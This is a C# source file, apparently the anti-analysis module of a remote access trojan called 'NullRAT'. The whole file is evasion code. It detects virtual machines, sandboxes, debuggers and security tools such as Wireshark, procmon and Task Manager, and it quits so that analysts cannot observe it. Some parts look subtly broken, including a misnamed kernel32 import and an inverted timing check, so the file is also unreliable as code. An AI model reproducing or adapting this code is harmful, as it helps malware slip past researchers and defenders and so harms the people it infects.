using System;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Net.NetworkInformation;
using System.Runtime.InteropServices;
using System.Threading;

namespace NullRAT.Utils
{
    public static class AntiAnalysis
    {
        public static void RunChecks()
        {
            try
            {
                if (IsInVM() || IsSandbox() || IsDebuggerPresent() || IsAnalysisToolRunning())
                {
                    Environment.Exit(0);
                }
            }
            catch { Environment.Exit(0); }
        }

        private static bool IsInVM()
        {
            if (Environment.ProcessorCount < 3) return true;

            long ram = new Microsoft.VisualBasic.Devices.ComputerInfo().TotalPhysicalMemory;
            if (ram < 3_500_000_000L) return true;

            try
            {
                using var searcher = new ManagementObjectSearcher("SELECT * FROM Win32_VideoController");
                foreach (ManagementObject obj in searcher.Get())
                {
                    string name = obj["Name"]?.ToString()?.ToLower() ?? "";
                    if (name.Contains("vmware") || name.Contains("virtualbox") || 
                        name.Contains("parallels") || name.Contains("qemu") || 
                        name.Contains("microsoft basic display"))
                        return true;
                }
            }
            catch { }

            try
            {
                using var searcher = new ManagementObjectSearcher("SELECT * FROM Win32_BIOS");
                foreach (ManagementObject obj in searcher.Get())
                {
                    string manufacturer = obj["Manufacturer"]?.ToString()?.ToLower() ?? "";
                    string version = obj["Version"]?.ToString()?.ToLower() ?? "";
                    if (manufacturer.Contains("vmware") || manufacturer.Contains("innotek") || 
                        version.Contains("virtual") || version.Contains("xen"))
                        return true;
                }
            }
            catch { }

            try
            {
                using var searcher = new ManagementObjectSearcher("SELECT * FROM Win32_ComputerSystem");
                foreach (ManagementObject obj in searcher.Get())
                {
                    string manufacturer = obj["Manufacturer"]?.ToString()?.ToLower() ?? "";
                    if (manufacturer.Contains("vmware") || manufacturer.Contains("xen") || 
                        manufacturer.Contains("qemu") || manufacturer.Contains("microsoft corporation"))
                        return true;
                }
            }
            catch { }

            foreach (NetworkInterface nic in NetworkInterface.GetAllNetworkInterfaces())
            {
                string mac = nic.GetPhysicalAddress().ToString();
                if (mac.StartsWith("00-05-69") || mac.StartsWith("00-0C-29") ||
                    mac.StartsWith("00-50-56") || mac.StartsWith("08-00-27") ||
                    mac.StartsWith("00-1C-42")) return true;
            }

            return false;
        }

        private static bool IsSandbox()
        {
            if (Process.GetCurrentProcess().StartTime.AddMinutes(5) > DateTime.Now)
                return true;

            if (!IsMouseMoved()) return true;

            string[] sandboxProcesses = {"malwarebazaar", "bazaar", "triage",
                "virustotal", "hybrid-analysis", "any.run", "anyrun", "cap",
                "sandbox", "cuckoo", "detonate", "joesandbox", "threatgrid",
                "falcon", "crowdstrike", "virus", "malware", "test", "sandbox",
                "analyzer", "analysis", "vm", "sample" };

            foreach (var proc in Process.GetProcesses())
            {
                string name = proc.ProcessName.ToLower();
                foreach (var s in sandboxProcesses)
                {
                    if (name.Contains(s)) return true;
                }
            }

            try
            {
                foreach (DriveInfo drive in DriveInfo.GetDrives())
                {
                    if (drive.DriveType == DriveType.Fixed && drive.TotalSize < 50_000_000_000L) // < 50GB
                        return true;
                }
            }
            catch { }

            return false;
        }

        private static bool IsDebuggerPresent()
        {
            if (CheckRemoteDebuggerPresent(Process.GetCurrentProcess().Handle, out bool isDebugger))
                return isDebugger;

            if (IsDebuggerPresentNative()) return true;

            long start = DateTime.Now.Ticks;
            Thread.Sleep(1);
            if (DateTime.Now.Ticks - start < 10000) return true;

            return false;
        }

        private static bool IsAnalysisToolRunning()
        {
            string[] badTools = {
                "processhacker", "taskmgr", "resource", "dnspy", "cheat", "hacker", 
                "debug", "monitor", "wireshark", "fiddler", "burp", "procmon", 
                "autoruns", "regmon", "filemon", "tcpview"
            };

            foreach (var proc in Process.GetProcesses())
            {
                string name = proc.ProcessName.ToLower();
                foreach (var tool in badTools)
                {
                    if (name.Contains(tool)) return true;
                }
            }
            return false;
        }

        private static bool IsMouseMoved()
        {
            try
            {
                POINT lastPos;
                GetCursorPos(out lastPos);

                Thread.Sleep(800);

                POINT newPos;
                GetCursorPos(out newPos);

                return lastPos.X != newPos.X || lastPos.Y != newPos.Y;
            }
            catch { return false; }
        }

        [DllImport("kernel32.dll")]
        private static extern bool CheckRemoteDebuggerPresent(IntPtr hProcess, out bool isDebuggerPresent);

        [DllImport("kernel32.dll")]
        private static extern bool IsDebuggerPresentNative();

        [DllImport("user32.dll")]
        private static extern bool GetCursorPos(out POINT lpPoint);

        [StructLayout(LayoutKind.Sequential)]
        private struct POINT
        {
            public int X;
            public int Y;
        }

        public static bool IsRunningUnderWine()
        {
            try
            {
                return Process.GetProcessesByName("winedbg").Length > 0 ||
                       Environment.GetEnvironmentVariable("WINEPREFIX") != null;
            }
            catch { return false; }
        }
    }
}